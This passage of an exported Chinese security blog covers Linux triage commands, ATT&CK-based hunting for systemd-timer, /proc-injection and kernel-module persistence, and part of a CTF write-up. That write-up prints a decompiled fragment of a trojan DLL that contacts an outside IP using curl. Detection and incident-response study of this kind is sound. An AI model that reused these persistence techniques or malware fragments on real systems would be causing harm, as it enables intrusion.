按名字搜索</p><ul>\n<li>其中<code>-name</code> 区分大小写，<code>-iname</code>不区分大小写，同时二者均支持使用<code>*</code>或者<code>?</code>进行模糊搜索</li>\n</ul>\n</li>\n<li><p><code>-type</code> 按文件类型搜索</p><ul>\n<li>其中<code>d</code>表示目录，<code>f</code>表示文件，<code>l</code>表示软链接</li>\n</ul>\n</li>\n<li><p><code>-perm</code> 按权限搜索</p></li>\n<li><p><code>-user</code> 按所属用户搜索</p></li>\n<li><p><code>-exec</code> 执行命令</p></li>\n</ul>\n<p>除此之外，<code>find</code>允许使用逻辑运算符</p><ul>\n<li><code>-a</code> 与</li>\n<li><code>-o</code>或</li>\n<li><code>-not</code> 非</li>\n</ul>\n<h3 id=\"grep\"><code>grep</code></h3>\n<ul>\n<li><p>基础匹配控制</p><ul>\n<li><code>-i</code> 区分大小写搜索</li>\n<li><code>-v</code> 反向搜索，举个例子，<code>grep -v &quot;error&quot; 1.txt</code> 就是列出<code>1.txt</code>中不含<code>error</code> 的行</li>\n<li><code>-w</code> 精确搜索，举个例子，<code>grep -w “is” 1.txt</code> 就是列出<code>1.txt</code>中包含<code>is</code>字段的行，并且不包括<code>whois</code> <code>this</code> 这种包含<code>is</code>字符却不是<code>is</code> 的字段</li>\n<li><code>-E</code> 正则搜索</li>\n</ul>\n</li>\n<li><p>输出结果控制</p><ul>\n<li><code>-n</code> 展示行号</li>\n<li><code>-c</code> 统计匹配到的行数</li>\n<li><code>-o</code> 只输出匹配到的部分 例如一条web日志，若使用<code>grep -o -E &quot;[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}&quot; access.log</code> 则只会输出IP</li>\n<li><code>-l</code> 只显示文件名，例如在一个文件夹下 使用<code>grep -l &quot;access&quot; *</code> 则只会告诉你有哪些文件包含了<code>access</code> 而不会输出文件的具体内容</li>\n</ul>\n</li>\n<li><p>递归搜索 <code>-r</code></p></li>\n<li><p>前序，后序</p><ul>\n<li><code>-A n</code> 显示后面n行内容</li>\n<li><code>-B n</code> 显示前面n行内容</li>\n<li><code>-C n</code> 显示前后各n行内容</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"lsof\"><code>lsof</code></h2>\n<p>为什么要给这玩意儿单开一栏呢？主要是他具备上面的大部分功能，又能查网络又能看进程的</p><p>在linux中，有着“一切皆文件”的理念，而<code>lsof</code>正是利用着这一点，以文件的角度看待网络连接和进程</p><p>常用命令：</p><pre><code class=\"language-bash\">lsof -p &lt;pid&gt; / lsof -c &lt;process&gt; #列出特定进程所打开的文件\nlsof -i #显示网络连接\nlsof -i :&lt;PORT&gt; #检测端口占用\nlsof -u &lt;username&gt; #展示特定用户打开的文件\nlsof &lt;file&gt; #展示特定文件的进程\n</code></pre>\n","excerpt":"水一篇常用的命令，为下一篇文章的例题做个小铺垫 先来看看netstat的常用的选项 ​ 好，那么接下来我们要做的就是把他们拼起来，当我们想查询所有网络连接情况时，就可以使用 netstat -pantu ss 同样的，先来查看有哪些选项，可以看到与netstat很相似 ​ 既然如此，那么如果要使用ss查看所有连接同样可以使用 ss -pantu ​ 可以使用ps aux查看当前的进程情况 ​ 其中 此外还可以使用其他选项进行更加细致的排查 -p &lt;PID&gt; #展示特定PID的进程 -u &lt;username&gt; #展示特定用户的进程 -C &lt;command&gt; #依据命令行查询进程 -f #全格式输出 top&hellip;","createdAt":1775836247316,"modifiedAt":1775836308515,"status":"published","isFeatured":false,"isHidden":false,"isExcludedOnHomepage":false,"hasGallery":false,"template":"","hasCustomExcerpt":false,"editor":"markdown","metaDescription":"","featuredImage":{},"tags":[],"hiddenTags":[],"mainTag":false,"postViewConfig":{}},{"id":11,"title":"Linux 入侵检测——围绕ATT&CK框架进行排查(2)","author":{"id":1,"name":"QAQ","username":"qaq","avatar":"","avatarImage":{"alt":"QAQ","height":240,"url":"","width":240},"email":"","website":"","description":"","postsNumber":7,"url":"https://lq-a-ql.github.io/qaq/qaq/index.html","featuredImage":{},"config":{},"additionalData":{},"template":"","authorViewConfig":{}},"slug":"linux-ru-qin-jian-ce-wei-rao-attandckkuang-jia-jin-xing-pai-cha2","url":"https://lq-a-ql.github.io/linux-ru-qin-jian-ce-wei-rao-attandckkuang-jia-jin-xing-pai-cha2.html","text":"<blockquote>\n<ul>\n<li><p>勘误 T1548.001</p><p>上一篇中对 T1548.001 设置SUID与SGID的描述并不准确，该技术的实现需要具有前提——文件的所属者必须是root/root组</p><p>同时文件需要给予普通用户可执行的权限，设置SUID或SGID并不能支持普通用户执行没有权限的文件，真正的使用场景应该如下</p><p>​\t1.黑客创建回连马并给予可执行权限</p><p>​\t2.黑客以root身份赋予回连马SUID</p><p>​\t3.普通用户（无root）运行回连马</p><p>​\t4.黑客拿到回连shell（root权限）</p></li>\n</ul>\n</blockquote>\n<p>在上一篇文章中介绍了ATT&amp;CK中部分攻击者持久化( <strong>TA0003</strong> )和提权( <strong>TA0004</strong> )的部分技术，这里将接续上文继续介绍如下技术</p><ul>\n<li>T1053.006 systemd 计时任务 </li>\n<li>T1055.009 /proc 进程注入</li>\n<li>T1547.006 加载恶意内核</li>\n</ul>\n<h3 id=\"t1053006\">T1053.006</h3>\n<blockquote>\n<p> 对手可能滥用systemd计时器来执行任务调度，以初始或定期执行恶意代码。Systemd计时器是文件扩展名为<code>.timer</code>的单元文件，用于控制服务。计时器可以设置为在日历事件或相对于起点的时间跨度后运行。它们可以作为Linux环境中<a href=\"https://attack.mitre.org/techniques/T1053/003\">Cron</a>的替代品。(引用: archlinux Systemd Timers Aug 2020) Systemd计时器可以通过<code>systemctl</code>命令行实用程序远程激活，该实用程序通过<a href=\"https://attack.mitre.org/techniques/T1021/004\">SSH</a>操作。(引用: Systemd Remote Control) 每个<code>.timer</code>文件必须有一个对应的<code>.service</code>文件，名称相同，例如<code>example.timer</code>和<code>example.service</code>。<code>.service</code>文件是<a href=\"https://attack.mitre.org/techniques/T1543/002\">Systemd服务</a>单元文件，由systemd系统和服务管理器管理。(引用: Linux man-pages: systemd January 2014) 特权计时器写入<code>/etc/systemd/system/</code>和<code>/usr/lib/systemd/system</code>，而用户级别的写入<code>~/.config/systemd/user/</code>。 对手可能使用systemd计时器在系统启动时或定期执行恶意代码以实现持久性。(引用: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(引用: gist Arch package compromise 10JUL2018)(引用: acroread package compromised Arch Linux Mail 8JUL2018) 使用特权路径安装的计时器可能用于保持root级别的持久性。对手也可能安装用户级别的计时器以实现用户级别的持久性。(引用: Falcon Sandbox smp: 28553b3a9d)</p></blockquote>\n<p>这是除了cron外的另一种另一种定时任务：在<code>/etc/systemd/system/</code>或者<code>/usr/lib/systemd/system</code>目录下还存在着后缀名位<code>.timer</code>的文件用于定时运行任务</p><p>​\t<img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260407232734598.png\" alt=\"image-20260407232734598\" style=\"zoom: 67%;\"  data-is-external-image=\"true\"></p><p>随便看一个timer，可以看到文件结构与<code>.service</code>类似，不同的是 <strong>[Service]</strong> 变成了 <strong>[Timer]</strong> 其中 <strong>OnCalendar</strong> 字段则代表了执行周期，daily意思就是每天的零点执行</p><blockquote>\n<p>timer默认指向同名service，可以使用 <strong>Unit</strong> 字段进行更改</p><p>上述<code>.timer</code>文件为系统级，用户级timer需要在~/.config/systemd/user自己创建<code>.timer</code>文件</p></blockquote>\n<p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260407233213727.png\" alt=\"image-20260407233213727\" data-is-external-image=\"true\"></figure></p><p>攻击者的路径就应该是：</p><ul>\n<li>创建恶意服务</li>\n<li>创建恶意timer，定期执行恶意服务</li>\n</ul>\n<p>相比于只有恶意服务来说，使用timer可以实现后门的重复执行以及断线重连，同时时间点分散，更难发现</p><h4 id=\"排查思路\">排查思路</h4>\n<pre><code class=\"language-bash\">systemctl list-timer -all\t\t\t\t#列出所有timer，筛选可疑timer\nsystemctl show &lt;timer名&gt; -p Unit\t\t\t#查看timer指向的service\nsystemctl cat &lt;service名&gt;                #查看可疑service的具体内容 重点关注ExecStart字段\n\n#用户级timer排查\nfind /home -path &quot;*/.config/systemd/user/*.timer&quot; 2&gt;/dev/null\n</code></pre>\n<blockquote>\n<p><code>/etc/systemd/system/</code>与<code>/usr/lib/systemd/system</code>的区别在前文叙述过，若在<code>/usr/lib/systemd/system</code>下发现非包管理器生成的timer或service则可直接列为怀疑对象</p><ul>\n<li>timer部分字段的解释</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>含义</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>OnActiveSec</code></td>\n<td>timer 激活后多久触发</td>\n<td><code>OnActiveSec=5min</code></td>\n</tr>\n<tr>\n<td><code>OnBootSec</code></td>\n<td>开机后多久触发</td>\n<td><code>OnBootSec=60</code></td>\n</tr>\n<tr>\n<td><code>OnStartupSec</code></td>\n<td>systemd 启动后多久触发</td>\n<td><code>OnStartupSec=30</code></td>\n</tr>\n<tr>\n<td><code>OnUnitActiveSec</code></td>\n<td>service 上次执行后间隔多久</td>\n<td><code>OnUnitActiveSec=10min</code></td>\n</tr>\n<tr>\n<td><code>OnUnitInactiveSec</code></td>\n<td>service 上次结束后间隔多久</td>\n<td><code>OnUnitInactiveSec=1h</code></td>\n</tr>\n<tr>\n<td><code>OnCalendar</code></td>\n<td>指定日历时间</td>\n<td><code>OnCalendar=*-*-* 03:00:00</code></td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>含义</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Unit</code></td>\n<td>指定触发哪个 service（默认同名）</td>\n<td><code>Unit=backdoor.service</code></td>\n</tr>\n<tr>\n<td><code>Persistent</code></td>\n<td>错过执行后开机是否补执行</td>\n<td><code>Persistent=true</code></td>\n</tr>\n<tr>\n<td><code>WakeSystem</code></td>\n<td>是否唤醒休眠的系统</td>\n<td><code>WakeSystem=false</code></td>\n</tr>\n<tr>\n<td><code>RemainAfterElapse</code></td>\n<td>执行完后 timer 是否保持活跃</td>\n<td><code>RemainAfterElapse=false</code></td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>含义</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>RandomizedDelaySec</code></td>\n<td>随机延迟时间范围</td>\n<td><code>RandomizedDelaySec=1h</code></td>\n</tr>\n<tr>\n<td><code>FixedRandomDelay</code></td>\n<td>延迟值固定（不每次随机）</td>\n<td><code>FixedRandomDelay=true</code></td>\n</tr>\n<tr>\n<td><code>AccuracySec</code></td>\n<td>触发精度范围</td>\n<td><code>AccuracySec=1min</code></td>\n</tr>\n</tbody></table>\n</blockquote>\n<hr>\n<h3 id=\"t1055009\">T1055.009</h3>\n<blockquote>\n<p>对手可能会通过 /proc 文件系统将恶意代码注入进程中，以规避基于进程的防御，并可能提升权限。进程内存注入是一种在单独的活动进程地址空间中执行任意代码的方法。 进程内存注入涉及通过 /proc 文件系统 (<code>/proc/[pid]</code>) 枚举进程的内存，然后使用可用的小工具/指令制作返回导向编程 (ROP) 负载。每个运行的进程都有自己的目录，其中包括内存映射。进程内存注入通常通过使用 /proc 文件系统提供的内存映射覆盖目标进程的堆栈来执行。这些信息可用于枚举偏移量（包括堆栈）和小工具（或程序中可用于构建恶意负载的指令），这些偏移量和小工具通常被进程内存保护（如地址空间布局随机化 (ASLR)）隐藏。一旦枚举完毕，可以使用 dd 覆盖 <code>/proc/[pid]/maps</code> 中的目标进程内存映射。(引用: Uninformed Needle)(引用: GDS Linux Injection)(引用: DD Man) 其他技术（如 <a href=\"https://attack.mitre.org/techniques/T1574/006\">动态链接器劫持</a>）可用于填充目标进程以提供更多可用的小工具。类似于 <a href=\"https://attack.mitre.org/techniques/T1055/012\">进程空洞化</a>，进程内存注入可能会针对子进程（如后台的 sleep 副本）。(引用: GDS Linux Injection) 在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过进程内存注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。</p></blockquote>\n<p>攻击者可以通过读取<code>/proc/[pid]/maps</code>文件中所以记录的可执行代码段，获某个内存映射的基址与偏移，然后计算其在内存中的绝对地址，接着就可以在这段内存中注入恶意payload</p><h4 id=\"排查方式\">排查方式</h4>\n<p>在可疑进程目录下执行<code>cat maps | grep -E &quot;rwx|r-x|--x&quot;</code> 查看某个可执行段是否指向正常的链接库</p><blockquote>\n<p>其实这个我不是很明白啊，T1055内存注入技术是一个挺大的板块，后续搞明白点会单独出一篇文章，今天就先水一水了（嘻嘻）</p></blockquote>\n<hr>\n<h3 id=\"t1547006\">T1547.006</h3>\n<blockquote>\n<p>对手可能会修改内核以在系统启动时自动执行程序。可加载内核模块（LKM）是可以按需加载和卸载到内核中的代码片段。它们扩展了内核的功能，而无需重新启动系统。例如，一种类型的模块是设备驱动程序，它允许内核访问连接到系统的硬件。(引用: Linux Kernel Programming) 恶意使用时，LKM可以是一种内核模式<a href=\"https://attack.mitre.org/techniques/T1014\">Rootkit</a>，以最高的操作系统权限（Ring 0）运行。(引用: Linux Kernel Module Programming Guide) LKM基于rootkit的常见功能包括：隐藏自身、选择性隐藏文件、进程和网络活动，以及日志篡改、提供认证的后门，并使非特权用户能够获得root访问权限。(引用: iDefense Rootkit Overview) 内核扩展，也称为kext，在macOS中用于加载功能，类似于Linux的LKM。由于内核负责执行安全性，并且内核扩展作为内核的一部分运行，因此kext不受macOS安全策略的约束。kext通过<code>kextload</code>和<code>kextunload</code>命令加载和卸载。kext需要使用开发者ID签名，该ID由Apple授予权限，允许其签名内核扩展。没有这些权限的开发者仍然可以签名kext，但除非禁用SIP，否则它们不会加载。如果启用了SIP，则在将kext添加到AuxKC之前会验证其签名。(引用: System and kernel extensions in macOS) 自macOS Catalina 10.15以来，内核扩展已被弃用，取而代之的是系统扩展。然而，kext仍然被允许作为“遗留系统扩展”，因为没有用于内核编程接口的系统扩展。(引用: Apple Kernel Extension Deprecation) 对手可以使用LKM和kext在系统上进行<a href=\"https://attack.mitre.org/tactics/TA0003\">持久性</a>和/或<a href=\"https://attack.mitre.org/tactics/TA0004\">权限提升</a>。在野外已经发现了一些示例，并且也有一些相关的开源项目。(引用: Volatility Phalanx2)(引用: CrowdStrike Linux Rootkit)(引用: GitHub Reptile)(引用: GitHub Diamorphine)(引用: RSAC 2015 San Francisco Patrick Wardle)(引用: Synack Secure Kernel Extension Broken)(引用: Securelist Ventir)(引用: Trend Micro Skidmap)</p></blockquote>\n<p>在linux中，root用户可以使用<code>insmod</code> <code>modprobe</code>的方式安装内核模块(<code>.ko</code>文件)。攻击者正是利用这点，在拿到权限后安装编译好的恶意内核即内核马实现持久化等目的。通过这种方式，即使服务器删除后门用户，更改账号密码，黑客仍然可以控制服务器</p><h4 id=\"排查方式-1\">排查方式</h4>\n<pre><code class=\"language-bash\">#1\nlsmod #列出运行中的模块，筛选可以模块\nmodinfo &lt;mod&gt; #查看可疑模块具体信息，重点关注 author和license字段（若为空则多半为恶意模块）\n\n\n#2\ndebsums -c | grep &quot;^/lib/modules/.*\\.ko&quot;   #使用debsums校验包完整性，检索被篡改模块\n\n#3\nfind /lib/modules/$(uname -r) -name &quot;*.ko*&quot; -mtime -7 -ls # 检索最近修改或创建的模块\n\n#4 \nchkrootkit  #使用开源排查工具\n</code></pre>\n<blockquote>\n<p>第二届长城杯半决赛的应急响应正巧是内核马，感兴趣可以看看，不过他是通过<code>.service</code>文件注入的，排查起来倒也没那么麻烦</p></blockquote>\n<hr>\n<p>ok啊，提权和持久化的部分就暂时告一段落了，后续会继续关注横向移动方面的技术，然后再水一篇linux的常用命令，然后感觉linux入侵检测这个系列就差不多了（似乎）。windows的话就不是很擅长，可能会写的有点晚，但也会写。现在感觉windows应急响应最好的方式就是拷一个360安装包过去（bushi）</p>","excerpt":"勘误 T1548.001 上一篇中对 T1548.001 设置SUID与SGID的描述并不准确，该技术的实现需要具有前提——文件的所属者必须是root/root组 同时文件需要给予普通用户可执行的权限，设置SUID或SGID并不能支持普通用户执行没有权限的文件，真正的使用场景应该如下 ​\t1.黑客创建回连马并给予可执行权限 ​\t2.黑客以root身份赋予回连马SUID ​\t3.普通用户（无root）运行回连马 ​\t4.黑客拿到回连shell（root权限） 在上一篇文章中介绍了ATT&amp;CK中部分攻击者持久化( TA0003 )和提权( TA0004 )的部分技术，这里将接续上文继续介绍如下技术 对手可能滥用systemd计时器来执行任务调度，以初始或定期执行恶意代码。Systemd计时器是文件扩展名为.timer的单元文件，用于控制服务。计时器可以设置为在日历事件或相对于起点的时间跨度后运行。它们可以作为Linux环境中Cron的替代品。(引用: archlinux Systemd Timers Aug 2020) Systemd计时器可以通过systemctl命令行实用程序远程激活，该实用程序通过SSH操作。(引用: Systemd Remote Control) 每个.timer文件必须有一个对应的.service文件，名称相同，例如example.timer和example.service。.service文件是Systemd服务单元文件，由systemd系统和服务管理器管理。(引用: Linux man-pages: systemd January&hellip;","createdAt":1775618098283,"modifiedAt":1775618098283,"status":"published","isFeatured":false,"isHidden":false,"isExcludedOnHomepage":false,"hasGallery":false,"template":"","hasCustomExcerpt":false,"editor":"markdown","metaDescription":"","featuredImage":{},"tags":[],"hiddenTags":[],"mainTag":false,"postViewConfig":{}},{"id":8,"title":" 2024CISCN&CCB初赛 SC05","author":{"id":1,"name":"QAQ","username":"qaq","avatar":"","avatarImage":{"alt":"QAQ","height":240,"url":"","width":240},"email":"","website":"","description":"","postsNumber":7,"url":"https://lq-a-ql.github.io/qaq/qaq/index.html","featuredImage":{},"config":{},"additionalData":{},"template":"","authorViewConfig":{}},"slug":"2024ciscnandccbchu-sai-sc05","url":"https://lq-a-ql.github.io/2024ciscnandccbchu-sai-sc05.html","text":"<h1 id=\"2024ccb-sc05\">2024CCB SC05</h1>\n<blockquote>\n<p>近日某公司网络管理员老张在对安全设备进行日常巡检过程中发现防火墙设备日志中产生了1条高危告警，告警IP为134.6.4.12（简称IP1），在监测到可疑网络活动后，老张立刻对磁盘和内存制做了镜像。为考校自己刚收的第一个徒弟李华，老张循序渐进，布置了5道问题。假如你是李华，请你根据提供的防火墙日志、磁盘镜像及内存镜像文件对主机开展网络安全检查分析，并根据5道问题提示，计算并提交相应flag。</p></blockquote>\n<h3 id=\"问题1：ip1地址首次被请求时间是多久？\">问题1：IP1地址首次被请求时间是多久？</h3>\n<img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313224720764.png\" alt=\"image-20260313224720764\" style=\"zoom: 25%;\"  data-is-external-image=\"true\">\n\n<p>查找一下ip就行，注意要在<strong>tcp-export</strong>处才能找到ip被首次请求的事件</p><h3 id=\"问题2：ip1地址对应的小马程序md5是多少？\">问题2：IP1地址对应的小马程序MD5是多少？</h3>\n<p>这一题打开附件的虚拟机，发现桌面上有一个火绒剑</p><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313225257731.png\" alt=\"image-20260313225257731\" style=\"zoom: 33%;\"  data-is-external-image=\"true\">\n\n<p>点击发现无法打开，于是选择使用旁边的<code>Process Hacker 2</code>，然后就能发现火绒剑很奇怪的与IP1建立了连接</p><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313225537787.png\" alt=\"image-20260313225537787\"  data-is-external-image=\"true\">\n\n<p>显而易见，这个火绒剑有问题</p><p>到目录下看一眼，发现<code>uactmon.dll</code>没有签名，有问题</p><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313225907245.png\" alt=\"image-20260313225907245\" style=\"zoom: 50%;\"  data-is-external-image=\"true\">\n\n<p>大概率这个就是咱要的小马，丢到ida里验证一下</p><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313230120122.png\" alt=\"image-20260313230120122\"  data-is-external-image=\"true\">\n\n<p>strings中找到一串url，追过去看看，发现一个可疑的函数<code>Func_1</code></p><pre><code class=\"language-C\">FARPROC Func_1()\n{\n  size_t v0; // eax\n  size_t v1; // eax\n  size_t v2; // eax\n  size_t v3; // eax\n  int v4; // eax\n  FARPROC result; // eax\n  unsigned int v6; // [esp+2Ch] [ebp-10Ch]\n  int Size; // [esp+40h] [ebp-F8h]\n  unsigned int i; // [esp+44h] [ebp-F4h]\n  char *v9; // [esp+48h] [ebp-F0h]\n  char v10[24]; // [esp+4Ch] [ebp-ECh] BYREF\n  char v11[128]; // [esp+64h] [ebp-D4h] BYREF\n  char Buffer[16]; // [esp+E4h] [ebp-54h] BYREF\n  _BYTE v13[16]; // [esp+F4h] [ebp-44h] BYREF\n  _BYTE v14[16]; // [esp+104h] [ebp-34h] BYREF\n  _BYTE v15[16]; // [esp+114h] [ebp-24h] BYREF\n  _BYTE v16[16]; // [esp+124h] [ebp-14h] BYREF\n\n  dword_6E2974C4 = (int)CreateMutexA(0, 0, &quot;Global\\\\UniqueMessageBoxMutex&quot;);\n  if ( dword_6E2974C4 &amp;&amp; GetLastError() != 183 &amp;&amp; curl_easy_init() )\n  {\n    sub_6E292D70(Buffer, &quot;%d.%d.%d.%d&quot;, 134);\n    memset(v13, 0, sizeof(v13));\n    memset(v14, 0, sizeof(v14));\n    mems
